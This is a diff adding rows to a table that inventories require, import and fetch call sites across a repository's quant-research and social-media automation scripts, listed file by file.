+| scripts/quant/v13/studies/run-s3.cjs | ` require(W.ROOT + '/scripts/quant/v12/requal/lib.cjs') ` |
+| scripts/quant/v13/studies/run-s3.cjs | ` require(W.ROOT + '/scripts/quant/v12/requal/p5a-population.cjs') ` |
+| scripts/quant/v13/studies/run-s3.cjs | ` require(W.ROOT + '/quant/engines/research-delisted-series.cjs') ` |
+| scripts/quant/v13/studies/run-s3.cjs | ` require(W.ROOT + '/scripts/quant/v12/requal/plan.cjs') ` |
+| scripts/quant/v13b/f1w/run.cjs | ` require(W.ROOT + '/quant/engines/research-delisted-series.cjs') ` |
+| scripts/quant/v13b/f1w/run.cjs | ` require(W.ROOT + '/scripts/quant/v10/studies/signal-study.cjs') ` |
+| scripts/quant/v13b/f1w/run.cjs | ` require(W.ROOT + '/scripts/quant/v13/studies/run-frame.cjs') ` |
+| scripts/quant/v13b/largecap-strict/evaluate-1.1.0.cjs | ` require(path.join(ROOT, 'scripts/quant/v13/largecap/evaluate.cjs')) ` |
+| scripts/quant/v13b/largecap-strict/evaluate-1.1.0.cjs | ` require(path.join(ROOT, 'quant/engines/weekly-real-adapter.cjs')) ` |
+| scripts/quant/v13c/lib.cjs | ` require(W.ROOT + '/quant/engines/research-delisted-series.cjs') ` |
+| scripts/quant/v13c/run-frame.cjs | ` require(W.ROOT + '/scripts/quant/v10/studies/signal-study.cjs') ` |
+| scripts/quant/v13c/run-frame.cjs | ` require(W.ROOT + '/scripts/quant/v13/studies/run-frame.cjs') ` |
+| scripts/quant/v13c/run-s3.cjs | ` require(W.ROOT + '/scripts/quant/v12/requal/lib.cjs') ` |
+| scripts/quant/v13c/run-s3.cjs | ` require(W.ROOT + '/scripts/quant/v12/requal/p5a-population.cjs') ` |
+| scripts/quant/v13c/run-s3.cjs | ` require(W.ROOT + '/scripts/quant/v13/studies/run-s3.cjs') ` |
+| scripts/quant/v13c/run-s3.cjs | ` require(W.ROOT + '/scripts/quant/v12/requal/plan.cjs') ` |
+| scripts/quant/v9-followups/ca-registry/before-after.cjs | ` require(path.join(root, 'quant/engines/research-weekly-loader.cjs')) ` |
+| scripts/quant/v9-followups/ca-registry/before-after.cjs | ` require(path.join(root, 'quant/engines/research-ca-evidence.cjs')) ` |
+| scripts/quant/v9-followups/ca-registry/export-frame.cjs | ` require(path.join(root, 'quant/engines/corporate-action-evidence.js')) ` |
+| scripts/quant/v9-followups/ca-registry/export-frame.cjs | ` require(path.join(root, 'quant/engines/research-weekly-loader.cjs')) ` |
+| scripts/quant/v9-followups/ca-registry/export-frame.cjs | ` require(path.join(root, 'quant/engines/research-identity-evidence.cjs')) ` |
+| scripts/quant/v9-followups/identity/before-after.cjs | ` require(enginePath) ` |
+| scripts/quant/v9-followups/identity/before-after.cjs | ` require(path.join(root, 'quant/engines/research-weekly-loader.cjs')) ` |
+| scripts/quant/v9-followups/identity/before-after.cjs | ` require(path.join(root, 'quant/engines/research-identity-evidence.cjs')) ` |
+| scripts/quant/v9-followups/ledger/build_before_after.cjs | ` require(path.join(ROOT, 'quant/engines/research-contract.cjs')) ` |
+| scripts/quant/v9-followups/ledger/build_before_after.cjs | ` require(path.join(ROOT, 'quant/engines/research-portfolio.cjs')) ` |
+| scripts/quant/v9-followups/ledger/build_before_after.cjs | ` require(path.resolve(arg('old-engine'))) ` |
+| scripts/quant/v9-followups/ledger/run_ca_ledger.cjs | ` require(path.join(ROOT, 'quant/engines/research-portfolio.cjs')) ` |
+| scripts/quant/v9-followups/ledger/run_ca_ledger.cjs | ` require(path.join(ROOT, 'quant/engines/research-contract.cjs')) ` |
+| scripts/quant/v9-followups/ledger/run_ca_ledger.cjs | ` require(path.join(ROOT, 'quant/engines/realtime/trading-session.js')) ` |
+| scripts/quant/v9-followups/ledger/run_ca_ledger.cjs | ` require(path.join(ROOT, 'quant/engines/return-series.js')) ` |
+| scripts/quant/v9-followups/ledger/run_ca_ledger.cjs | ` require(path.resolve(arg('old-engine'))) ` |
+| scripts/quant/v9-followups/ledger/v8_node_shim.cjs | ` require(path.resolve(process.env.ENGINE)) ` |
+| scripts/quant/v9/corporate-actions/proposal_dryrun.cjs | ` require(path.join(ROOT, 'quant/engines/weekly-real-adapter.cjs')) ` |
+| scripts/quant/v9/corporate-actions/proposal_dryrun.cjs | ` require(path.join(ROOT, 'quant/engines/corporate-action-evidence.js')) ` |
+| scripts/quant/v9/corporate-actions/triage.cjs | ` require(path.join(ROOT, 'quant/engines/weekly-real-adapter.cjs')) ` |
+| scripts/quant/v9/corporate-actions/triage.cjs | ` require(path.join(ROOT, 'quant/engines/corporate-action-evidence.js')) ` |
+| scripts/quant/v9/events/harvest_8k_items.py | ` fetch(out): ` |
+| scripts/quant/v9/events/harvest_8k_items.py | ` fetch(o) if a.phase == 'fetch' else parse(o) ` |
+| scripts/quant/v9/events/population.cjs | ` require(path.join(ROOT, 'quant/engines/weekly-real-adapter.cjs')) ` |
+| scripts/quant/v9/events/run-v9-events.cjs | ` require(path.join(ROOT, 'quant/engines/research-studies.cjs')) ` |
+| scripts/quant/v9/events/run-v9-events.cjs | ` require(path.join(ROOT, 'quant/engines/research-validation.cjs')) ` |
+| scripts/quant/v9/events/run-v9-events.cjs | ` require(path.join(ROOT, 'quant/engines/research-contract.cjs')) ` |
+| scripts/quant/v9/events/run-v9-events.cjs | ` require(path.join(ROOT, 'quant/engines/realtime/trading-session.js')) ` |
+| scripts/quant/v9/identity/dry-run-qualification.cjs | ` require(path.join(root, 'quant/engines/weekly-real-adapter.cjs')) ` |
+| scripts/quant/v9/identity/reproduce-weekly-reasons.cjs | ` require(path.join(root, 'quant/engines/weekly-real-adapter.cjs')) ` |
+| scripts/quant/v9/portfolio/run_ledger.cjs | ` require(path.join(ROOT, 'quant/engines/research-portfolio.cjs')) ` |
+| scripts/quant/v9/portfolio/run_ledger.cjs | ` require(path.join(ROOT, 'quant/engines/research-contract.cjs')) ` |
+| scripts/quant/v9/portfolio/run_ledger.cjs | ` require(path.join(ROOT, 'quant/engines/realtime/trading-session.js')) ` |
+| scripts/quant/v9/portfolio/run_ledger.cjs | ` require(path.join(ROOT, 'quant/engines/return-series.js')) ` |
+| scripts/quant/v9/portfolio/run_terminal_ledger.cjs | ` require(path.join(ROOT, 'quant/engines/research-portfolio.cjs')) ` |
+| scripts/quant/v9/portfolio/run_terminal_ledger.cjs | ` require(path.join(ROOT, 'quant/engines/research-contract.cjs')) ` |
+| scripts/quant/v9/portfolio/run_terminal_ledger.cjs | ` require(path.join(ROOT, 'quant/engines/realtime/trading-session.js')) ` |
+| scripts/quant/v9/secpit/impact.mjs | ` require(join(ROOT, "quant/engines/fundamental-inputs.js")) ` |
+| scripts/quant/v9/secpit/impact.mjs | ` require(join(ROOT, "quant/engines/pit-fundamental-history.js")) ` |
+| scripts/quant/v9/sensitivity/run-v9-sensitivity.cjs | ` require(ROOT + '/quant/engines/research-contract.cjs'), A = require(ROOT + '/quant/engines/weekly-real-adapter.cjs') ` |
+| scripts/quant/v9/sensitivity/run-v9-sensitivity.cjs | ` require(ROOT + '/quant/engines/research-studies.cjs'), V = require(ROOT + '/quant/engines/research-validation.cjs'), B = require(ROOT + '/quant/engines/weekly-benchmark ` |
+| scripts/quant/v9_followups/sec_pipeline/before-after.mjs | ` require(join(ROOT, "quant/engines/fundamental-inputs.js")) ` |
+| scripts/quant/v9_followups/sec_pipeline/before-after.mjs | ` require(join(ROOT, "quant/engines/market-cap.js")) ` |
+| scripts/quant/v9_followups/sec_pipeline/verify_quarantine_detection.py | ` require(process.argv[1]) ` |
+| scripts/quant/verify-golden-five-backtest-readiness.mjs | ` require(join(root, "core", "identity.js")) ` |
+| scripts/quant/verify-golden-five-backtest-readiness.mjs | ` require(join(root, "providers", "sec", "adapter.js")) ` |
+| scripts/research/edge/edge-quant.test.cjs | ` require(path.join(ROOT, 'quant/engines/portfolio-backtest.cjs')) ` |
+| scripts/research/edge/quant-e3.cjs | ` require(path.join(ROOT, 'quant/engines/research-portfolio.cjs')) ` |
+| scripts/research/edge/quant-e3.cjs | ` require(path.join(ROOT, 'quant/engines/backtest-metrics.cjs')) ` |
+| scripts/research/edge/quant-e3.cjs | ` require(path.join(ROOT, 'quant/engines/portfolio-pit-factors.cjs')) ` |
+| scripts/research/edge/quant-e3.cjs | ` require(path.join(ROOT, 'quant/engines/portfolio-construction.cjs')) ` |
+| scripts/research/edge/quant-e3.cjs | ` require(path.join(ROOT, 'quant/engines/portfolio-backtest.cjs')) ` |
+| scripts/research/edge/run-e3.cjs | ` require(path.join(ROOT, 'vorsorge/engines/series-codec.js')) ` |
+| scripts/research/edge/run-e3.cjs | ` require(path.join(ROOT, 'scripts/quant/portfolio/model-portfolios.cjs')) ` |
+| scripts/research/edge/run-e3.cjs | ` require(path.join(ROOT, 'vorsorge/engines/series-codec.js')) ` |
+| scripts/research/edge/st-e3.cjs | ` require(path.resolve(__dirname, '../../../quant/engines/portfolio-construction.cjs')) ` |
+| scripts/research/edge2/blind.cjs | ` require(path.join(ROOT, 'quant/engines/portfolio-pit-factors.cjs')) ` |
+| scripts/research/edge2/blind.cjs | ` require(path.join(ROOT, 'quant/engines/portfolio-construction.cjs')) ` |
+| scripts/research/edge2/blind.cjs | ` require(path.join(ROOT, 'quant/engines/research-portfolio.cjs')) ` |
+| scripts/research/edge2/dna.cjs | ` require(path.join(ROOT, 'quant/engines/portfolio-pit-factors.cjs')) ` |
+| scripts/research/edge2/dna.cjs | ` require(path.join(ROOT, 'quant/engines/portfolio-construction.cjs')) ` |
+| scripts/research/edge2/dna.cjs | ` require(path.join(ROOT, 'quant/engines/portfolio-backtest.cjs')) ` |
+| scripts/research/edge2/dna.cjs | ` require(path.join(ROOT, 'quant/engines/research-portfolio.cjs')) ` |
+| scripts/research/edge2/edge2.cjs | ` require(path.join(ROOT, 'quant/engines/portfolio-construction.cjs')) ` |
+| scripts/research/edge2/edge2.cjs | ` require(path.join(ROOT, 'quant/engines/portfolio-backtest.cjs')) ` |
+| scripts/research/edge2/edge2.cjs | ` require(path.join(ROOT, 'quant/engines/research-portfolio.cjs')) ` |
+| scripts/research/edge2/ki-export.cjs | ` require(path.join(ROOT, 'quant/engines/published-close.js')) ` |
+| scripts/research/edge2/ki-forward.cjs | ` require(path.join(ROOT, 'quant/engines/published-close.js')) ` |
+| scripts/research/edge2/ki-forward.cjs | ` require(path.join(ROOT, 'scripts/quant/portfolio/model-portfolios.cjs')), MD = require(path.join(ROOT, 'scripts/quant/portfolio/model-depots.cjs')) ` |
+| scripts/research/edge2/paper.cjs | ` require(path.join(ROOT, 'scripts/quant/portfolio/model-portfolios.cjs')), MD = require(path.join(ROOT, 'scripts/quant/portfolio/model-depots.cjs')) ` |
+| scripts/research/edge2/paper.cjs | ` import(path.join(ROOT, 'scripts/research/signals/study.mjs')).then(S1 => { ` |
+| scripts/research/edge2/paper.cjs | ` require(path.join(ROOT, 'quant/engines/technical/trade-setup.js')) }) ` |
+| scripts/research/edge2/run-blind.cjs | ` require(path.join(ROOT, 'quant/engines/portfolio-backtest.cjs')) ` |
+| scripts/research/edge2/run-blind.cjs | ` require(path.join(ROOT, 'quant/engines/portfolio-construction.cjs')) ` |
+| scripts/research/edge2/run-blind.cjs | ` import(path.join(ROOT, 'scripts/supertrader/validation/lib.mjs')) ` |
+| scripts/research/edge2/run-blind.cjs | ` import(path.join(ROOT, 'scripts/market/storage/s3-driver.mjs')) ` |
+| scripts/research/edge2/run-blind.cjs | ` require(path.join(ROOT, 'scripts/quant/portfolio/model-portfolios.cjs')) ` |
+| scripts/research/edge2/run-dna.cjs | ` require(path.join(ROOT, 'scripts/quant/portfolio/model-portfolios.cjs')), E3 = require('../edge/run-e3.cjs') ` |
+| scripts/research/edge2/run-dna.cjs | ` import(path.join(ROOT, 'scripts/supertrader/validation/lib.mjs')) ` |
+| scripts/research/edge2/run-edge2.cjs | ` require(path.join(ROOT, 'scripts/quant/portfolio/model-portfolios.cjs')) ` |
+| scripts/research/edge2/run-edge2.cjs | ` require(path.join(ROOT, 'quant/engines/research-delisted-series.cjs')) ` |
+| scripts/research/edge2/run-edge2.cjs | ` require(path.join(ROOT, 'scripts/quant/portfolio/model-portfolios.cjs')), E3 = require('../edge/run-e3.cjs') ` |
+| scripts/research/edge2/run-edge2.cjs | ` import(path.join(ROOT, 'scripts/research/signals/study.mjs')) ` |
+| scripts/research/edge2/run-edge2.cjs | ` require(path.join(ROOT, 'quant/engines/technical/trade-setup.js')) ` |
+| scripts/research/edge2/run-edge2.cjs | ` import(path.join(ROOT, 'scripts/supertrader/validation/lib.mjs')) ` |
+| scripts/research/holdout/combine.mjs | ` import(path.join(ROOT, 'scripts/supertrader/validation/lib.mjs')) ` |
+| scripts/research/holdout/holdout.test.cjs | ` import(path.join(ROOT, 'scripts/supertrader/source-faithful/research/run-st-holdout.mjs')) ` |
+| scripts/research/holdout/holdout.test.cjs | ` import(path.join(__dirname, 'ledger.mjs')) ` |
+| scripts/research/holdout/holdout.test.cjs | ` import(path.join(ROOT, 'scripts/supertrader/source-faithful/research/run-st-holdout.mjs')) ` |
+| scripts/research/holdout/holdout.test.cjs | ` import(path.join(__dirname, 'combine.mjs')) ` |
+| scripts/research/holdout/quant-holdout.cjs | ` import(path.join(ROOT, 'scripts/research/holdout/ledger.mjs')) ` |
+| scripts/research/holdout/quant-holdout.cjs | ` import(path.join(ROOT, 'scripts/market/storage/s3-driver.mjs')) ` |
+| scripts/research/holdout/quant-holdout.cjs | ` require(path.join(ROOT, 'scripts/quant/portfolio/model-portfolios.cjs')), E3 = require('../edge/run-e3.cjs') ` |
+| scripts/research/holdout/quant-holdout.cjs | ` import(path.join(ROOT, 'scripts/supertrader/validation/lib.mjs')) ` |
+| scripts/research/labor/build-insider.mjs | ` require(path.join(ROOT, 'quant/engines/ownership-signals.js')) ` |
+| scripts/research/labor/build-insider.mjs | ` import(path.join(ROOT, 'scripts/market/build-ownership-signals.mjs')) ` |
+| scripts/research/labor/etf-engine.cjs | ` require(path.join(ROOT, 'vorsorge/engines/series-codec.js')) ` |
+| scripts/research/labor/run-labor.cjs | ` require(path.join(ROOT, 'scripts/quant/portfolio/model-portfolios.cjs')) ` |
+| scripts/research/labor/run-labor.cjs | ` require(path.join(ROOT, 'scripts/research/edge/quant-e3.cjs')) ` |
+| scripts/research/labor/run-labor.cjs | ` require(path.join(ROOT, 'vorsorge/engines/series-codec.js')) ` |
+| scripts/research/labor/signals.cjs | ` require(path.join(ROOT, 'quant/engines/portfolio-pit-factors.cjs')) ` |
+| scripts/research/labor/stats.cjs | ` require(path.join(__dirname, '../edge/study.cjs')) ` |
+| scripts/research/labor/stock-engine.cjs | ` require(path.join(ROOT, 'quant/engines/research-portfolio.cjs')) ` |
+| scripts/research/labor/stock-engine.cjs | ` require(path.join(ROOT, 'quant/engines/portfolio-construction.cjs')) ` |
+| scripts/research/labor/stock-engine.cjs | ` require(path.join(ROOT, 'quant/engines/portfolio-pit-factors.cjs')) ` |
+| scripts/research/labor/stock-engine.cjs | ` require(path.join(ROOT, 'scripts/research/edge/quant-e3.cjs')) ` |
+| scripts/screener/browser-qa.mjs | ` require(process.env.PLAYWRIGHT_PATH &#124;&#124; '/opt/node22/lib/node_modules/playwright') ` |
+| scripts/social/approval-center-readiness.mjs | ` require(join(ROOT, "social/engines/owner-decision.js")) ` |
+| scripts/social/assert-no-secrets.mjs | ` require(join(ROOT, "social/engines/provider.js")) ` |
+| scripts/social/assess-creative-quality.mjs | ` require(join(ROOT, "social/engines/story-selection.js")) ` |
+| scripts/social/assess-creative-quality.mjs | ` require(join(ROOT, "social/engines/creative-quality.js")) ` |
+| scripts/social/assess-creative-quality.mjs | ` require(join(ROOT, "social/engines/score-decomposition.js")) ` |
+| scripts/social/asset-hashtag-done.mjs | ` require(join(ROOT, "social/engines/hashtags.js")) ` |
+| scripts/social/asset-hashtag-done.mjs | ` require(join(ROOT, "social/engines/content-ladder.js")) ` |
+| scripts/social/asset-hashtag-done.mjs | ` require(join(ROOT, "social/engines/owner-decision.js")) ` |
+| scripts/social/asset-hashtag-done.mjs | ` require(join(ROOT, "social/engines/approval-projection.js")) ` |
+| scripts/social/asset-hashtag-done.mjs | ` fetch(WORKER + pfad, { method: "GET" }) ` |
+| scripts/social/backfill-account-memory.mjs | ` require(join(ROOT, "social/engines/evidence-regime.js")) ` |
+| scripts/social/build-opportunity-slate.mjs | ` require(join(ROOT, "social/engines/content-universe.js")) ` |
+| scripts/social/build-opportunity-slate.mjs | ` require(join(ROOT, "social/engines/discover-evidence.js")) ` |
+| scripts/social/build-opportunity-slate.mjs | ` require(join(ROOT, "social/engines/signals.js")) ` |
+| scripts/social/build-opportunity-slate.mjs | ` require(join(ROOT, "social/engines/german-text.js")) ` |
+| scripts/social/build-opportunity-slate.mjs | ` require(join(ROOT, "social/engines/fact-check.js")) ` |
+| scripts/social/build-research-package.mjs | ` require(join(ROOT, "social/engines/research-package.js")) ` |
+| scripts/social/build-research-package.mjs | ` fetch(url, { signal: controller.signal, redirect: "follow", ` |
+| scripts/social/check-asset-reachability.mjs | ` require(join(ROOT, "social/engines/asset-delivery.js")) ` |
+| scripts/social/check-asset-reachability.mjs | ` fetch(url, { method: "GET", redirect: "manual" }) ` |
+| scripts/social/check-hard-invariants.mjs | ` require(join(ROOT, "social/engines/hard-invariants.js")) ` |
+| scripts/social/check-hard-invariants.mjs | ` require(join(ROOT, "social/engines/source-registry.js")) ` |
+| scripts/social/check-hard-invariants.mjs | ` require(join(ROOT, "social/engines/creative-job.js")) ` |
+| scripts/social/check-hard-invariants.mjs | ` import(     join(ROOT, "workers/vision-universe-social/src/index.js"))).default ` |
+| scripts/social/check-hard-invariants.mjs | ` fetch(new Request( ` |
+| scripts/social/creative-job-report.mjs | ` require(join(ROOT, "social/engines/creative-job.js")) ` |
+| scripts/social/decide-candidate.mjs | ` require(join(ROOT, "social/engines/content-hash.js")) ` |
+| scripts/social/decide-candidate.mjs | ` require(join(ROOT, "social/engines/owner-decision.js")) ` |
+| scripts/social/diagnose-creative-provider.mjs | ` require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) ` |
+| scripts/social/discover-creators.mjs | ` require(join(ROOT, "social/engines/creator-universe.js")) ` |
+| scripts/social/discover-creators.mjs | ` require(join(ROOT, "social/engines/youtube-source.js")) ` |
+| scripts/social/discover-creators.mjs | ` require(join(ROOT, "social/engines/youtube-query-portfolio.js")) ` |
+| scripts/social/discover-creators.mjs | ` fetch(url, { headers: { "X-goog-api-key": key } }) ` |
+| scripts/social/dispatch-creative-job.mjs | ` require(join(ROOT, "social/engines/creative-job.js")) ` |
+| scripts/social/dispatch-creative-job.mjs | ` require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) ` |
+| scripts/social/dispatch-publications.mjs | ` require(join(ROOT, "social/engines/publishing.js")) ` |
+| scripts/social/dispatch-publications.mjs | ` require(join(ROOT, "social/engines/autonomy.js")) ` |
+| scripts/social/dispatch-publications.mjs | ` require(join(ROOT, "social/engines/kill-switch.js")) ` |
+| scripts/social/enrich-youtube-metrics.mjs | ` require(join(ROOT, "social/engines/youtube-source.js")) ` |
+| scripts/social/enrich-youtube-metrics.mjs | ` require(join(ROOT, "social/engines/external-patterns.js")) ` |
+| scripts/social/enrich-youtube-metrics.mjs | ` require(join(ROOT, "social/engines/external-intelligence.js")) ` |
+| scripts/social/enrich-youtube-metrics.mjs | ` fetch(url, { headers: { "X-goog-api-key": key } }) ` |
+| scripts/social/fetch-meta-status.mjs | ` fetch(workerUrl + path, { ` |
+| scripts/social/ig-reel.mjs | ` fetch(req.url, { method: req.method, headers: Object.assign({ authorization: "Bearer " + key }, ` |
+| scripts/social/ig.mjs | ` fetch(url, { headers: { authorization: "Bearer " + key } }) ` |
+| scripts/social/ingest-creative.mjs | ` require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) ` |
+| scripts/social/ingest-creative.mjs | ` require(join(ROOT, "social/engines/asset-integrity.js")) ` |
+| scripts/social/ingest-creative.mjs | ` require(join(ROOT, "social/engines/invocation-ledger.js")) ` |
+| scripts/social/ingest-creative.mjs | ` require(join(ROOT, "social/engines/creative-contract.js")) ` |
+| scripts/social/ingest-creative.mjs | ` require(join(ROOT, "social/engines/creative-job.js")) ` |
+| scripts/social/ingest-external-observation.mjs | ` require(join(ROOT, "social/engines/external-intelligence.js")) ` |
+| scripts/social/ingest-external-observation.mjs | ` require(join(ROOT, "social/engines/hashtag-portfolio.js")) ` |
+| scripts/social/ingest-external-observation.mjs | ` require(join(ROOT, "social/engines/external-patterns.js")) ` |
+| scripts/social/ingest-open-creative-jobs.mjs | ` require(join(ROOT, "social/engines/creative-job.js")) ` |
+| scripts/social/ingest-owner-decisions.mjs | ` fetch(WORKER + "/social/approval/decisions", { ` |
+| scripts/social/ingest-performance.mjs | ` require(join(ROOT, "social/engines/schema.js")) ` |
+| scripts/social/ingest-performance.mjs | ` require(join(ROOT, "social/engines/measurement-window.js")) ` |
+| scripts/social/make-carousel-candidates.mjs | ` require(join(ROOT, "social/engines/content-hash.js")) ` |
+| scripts/social/make-carousel-candidates.mjs | ` require(join(ROOT, "social/engines/style-references.js")) ` |
+| scripts/social/make-carousel-candidates.mjs | ` require(join(ROOT, "quant/engines/hash.js")) ` |
+| scripts/social/make-carousel-candidates.mjs | ` require(join(ROOT, "social/engines/creative-gate.js")) ` |
+| scripts/social/make-carousel-candidates.mjs | ` require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) ` |
+| scripts/social/make-carousel-candidates.mjs | ` require(join(ROOT, "social/engines/creative-contract.js")) ` |
+| scripts/social/make-carousel-candidates.mjs | ` require(join(ROOT, "social/config/cadence.json")) ` |
+| scripts/social/make-publish-candidate.mjs | ` require(join(ROOT, "social/engines/content-hash.js")) ` |
+| scripts/social/make-publish-candidate.mjs | ` require(join(ROOT, "social/engines/hashtags.js")) ` |
+| scripts/social/make-publish-candidate.mjs | ` require(join(ROOT, "social/engines/owner-decision.js")) ` |
+| scripts/social/make-publish-candidate.mjs | ` require(join(ROOT, "quant/engines/hash.js")) ` |
+| scripts/social/make-publish-candidate.mjs | ` require(join(ROOT, "social/engines/creative-gate.js")) ` |
+| scripts/social/make-publish-candidate.mjs | ` require(join(ROOT, "social/engines/manual-mode.js")) ` |
+| scripts/social/make-test-asset.mjs | ` fetch(       "https://fonts.googleapis.com/css2?family=Inter:wght@400 ` |
+| scripts/social/make-test-asset.mjs | ` fetch(url).then((r) => r.arrayBuffer())) ` |
+| scripts/social/manual-now-web-candidate.mjs | ` require(join(ROOT, "social/engines/content-hash.js")) ` |
+| scripts/social/manual-now-web-candidate.mjs | ` require(join(ROOT, "social/engines/owner-decision.js")) ` |
+| scripts/social/manual-now-web-candidate.mjs | ` require(join(ROOT, "quant/engines/hash.js")) ` |
+| scripts/social/manual-now-web-candidate.mjs | ` require(join(ROOT, "social/engines/creative-gate.js")) ` |
+| scripts/social/manual-now-web-candidate.mjs | ` require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) ` |
+| scripts/social/manual-now-web-candidate.mjs | ` require(join(ROOT, "social/config/cadence.json")) ` |
+| scripts/social/open-creative-request.mjs | ` require(join(ROOT, "social/engines/creative-job.js")) ` |
+| scripts/social/open-creative-request.mjs | ` require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) ` |
+| scripts/social/order-d-done.mjs | ` require(join(ROOT, "social/engines/hard-invariants.js")) ` |
+| scripts/social/order-d-done.mjs | ` require(join(ROOT, "social/engines/no-post.js")) ` |
+| scripts/social/order-d-done.mjs | ` require(join(ROOT, "social/engines/run-lease.js")) ` |
+| scripts/social/order-d-done.mjs | ` require(join(ROOT, "social/engines/frequency-learning.js")) ` |
+| scripts/social/order-d-done.mjs | ` fetch(WORKER + pfad, init) ` |
+| scripts/social/plan-hashtag-observation.mjs | ` require(join(ROOT, "social/engines/hashtag-portfolio.js")) ` |
+| scripts/social/preflight-worker.mjs | ` fetch(request, ` |
+| scripts/social/preflight-worker.mjs | ` fetch(API + path, Object.assign({ ` |
+| scripts/social/product-proof.mjs | ` require(join(ROOT, "social/engines/brand.js")) ` |
+| scripts/social/product-proof.mjs | ` require(join(ROOT, "social/engines/visual-grammar.js")) ` |
+| scripts/social/product-proof.mjs | ` require(join(ROOT, "social/engines/scroll-stop.js")) ` |
+| scripts/social/product-proof.mjs | ` require(join(ROOT, "social/engines/content.js")) ` |
+| scripts/social/product-proof.mjs | ` require(join(ROOT, "social/engines/hashtags.js")) ` |
+| scripts/social/product-proof.mjs | ` require(join(ROOT, "social/engines/learning-unit.js")) ` |
+| scripts/social/product-proof.mjs | ` require(join(ROOT, "social/engines/audience-frame.js")) ` |
+| scripts/social/product-proof.mjs | ` require(   join(ROOT, "social/engines/visual-intelligence.js")) ` |
+| scripts/social/product-proof.mjs | ` require(   join(ROOT, "social/engines/visual-composition.js")) ` |
+| scripts/social/production-readiness.mjs | ` require(join(ROOT, "social/engines/production-readiness.js")) ` |
+| scripts/social/production-readiness.mjs | ` require(join(ROOT, "social/engines/source-registry.js")) ` |
+| scripts/social/production-readiness.mjs | ` require(join(ROOT, "social/engines/orchestrator.js")) ` |
+| scripts/social/production-readiness.mjs | ` require(join(ROOT, "social/engines/visual-intelligence.js")) ` |
+| scripts/social/production-readiness.mjs | ` require(join(ROOT, "social/engines/visual-quality.js")) ` |
+| scripts/social/production-readiness.mjs | ` require(join(ROOT, "social/engines/creative-job.js")) ` |
+| scripts/social/production-readiness.mjs | ` require(join(ROOT, "social/engines/own-performance.js")) ` |
+| scripts/social/production-readiness.mjs | ` require(join(ROOT, "social/engines/schema.js")) ` |
+| scripts/social/production-readiness.mjs | ` require(join(ROOT, "social/engines/learning.js")) ` |
+| scripts/social/production-readiness.mjs | ` require(join(ROOT, "social/engines/owner-decision.js")) ` |
+| scripts/social/production-readiness.mjs | ` import(${JSON.stringify(join(ROOT, pfad))}) ` |
+| scripts/social/prove-loop-closure.mjs | ` require(join(ROOT, "social/engines/evidence-regime.js")) ` |
+| scripts/social/provision-cloudflare.mjs | ` fetch(API + path, Object.assign({ ` |
+| scripts/social/publish-approval-queue.mjs | ` require(join(ROOT, "social/engines/owner-decision.js")) ` |
+| scripts/social/publish-approval-queue.mjs | ` require(join(ROOT, "social/engines/approval-projection.js")) ` |
+| scripts/social/publish-approval-queue.mjs | ` require(join(ROOT, "social/engines/asset-delivery.js")) ` |
+| scripts/social/publish-approval-queue.mjs | ` require(join(ROOT, "social/engines/content-hash.js")) ` |
+| scripts/social/publish-approval-queue.mjs | ` require(join(ROOT, "social/engines/hashtags.js")) ` |
+| scripts/social/publish-approval-queue.mjs | ` fetch(url, { method: "GET", redirect: "manual" }) ` |
+| scripts/social/rank-social-opportunities.mjs | ` require(join(ROOT, "social/engines/opportunity.js")) ` |
+| scripts/social/rank-social-opportunities.mjs | ` require(join(ROOT, "social/engines/social-opportunity.js")) ` |
+| scripts/social/rank-social-opportunities.mjs | ` require(join(ROOT, "social/engines/brand.js")) ` |
+| scripts/social/rank-social-opportunities.mjs | ` require(join(ROOT, "social/engines/audience-frame.js")) ` |
+| scripts/social/rank-social-opportunities.mjs | ` require(join(ROOT, "social/engines/memory.js")) ` |
+| scripts/social/rank-social-opportunities.mjs | ` require(join(ROOT, "social/engines/source-registry.js")) ` |
+| scripts/social/rank-social-opportunities.mjs | ` require(join(ROOT, "social/engines/own-performance.js")) ` |
+| scripts/social/rank-social-opportunities.mjs | ` require(join(ROOT, "social/engines/learning.js")) ` |
+| scripts/social/reconcile-creative-jobs.mjs | ` require(join(ROOT, "social/engines/creative-job.js")) ` |
+| scripts/social/recover-asset-transfer.mjs | ` require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) ` |
+| scripts/social/recover-asset-transfer.mjs | ` require(join(ROOT, "social/engines/asset-transport.js")) ` |
+| scripts/social/recover-asset-transfer.mjs | ` require(join(ROOT, "social/engines/asset-integrity.js")) ` |
+| scripts/social/recover-creative-request.mjs | ` require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) ` |
+| scripts/social/recover-creative-request.mjs | ` require(join(ROOT, "social/engines/provider-lifecycle.js")) ` |
+| scripts/social/recover-creative-request.mjs | ` require(join(ROOT, "social/engines/invocation-ledger.js")) ` |
+| scripts/social/render-asset.mjs | ` require(   join(dirname(fileURLToPath(import.meta.url)), "..", "..", "social/engines/visual-quality.js")) ` |
+| scripts/social/render-asset.mjs | ` require(   join(dirname(fileURLToPath(import.meta.url)), "..", "..", "social/engines/visual-grammar.js")) ` |
+| scripts/social/render-asset.mjs | ` require(   join(dirname(fileURLToPath(import.meta.url)), "..", "..", "social/engines/scroll-stop.js")) ` |
+| scripts/social/render-asset.mjs | ` require(   join(dirname(fileURLToPath(import.meta.url)), "..", "..", "social/engines/brand.js")) ` |
+| scripts/social/render-asset.mjs | ` require(   join(dirname(fileURLToPath(import.meta.url)), "..", "..", "social/engines/content-intelligence.js")) ` |
+| scripts/social/render-asset.mjs | ` require(   join(dirname(fileURLToPath(import.meta.url)), "..", "..", "social/engines/visual-composition.js")) ` |
+| scripts/social/request-carousel.mjs | ` require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) ` |
+| scripts/social/request-carousel.mjs | ` require(join(ROOT, "social/engines/invocation-ledger.js")) ` |
+| scripts/social/request-carousel.mjs | ` require(join(ROOT, "social/engines/social-learnings.js")) ` |
+| scripts/social/request-carousel.mjs | ` require(join(ROOT, "social/engines/brand.js")) ` |
+| scripts/social/request-carousel.mjs | ` require(join(ROOT, "social/engines/style-references.js")) ` |
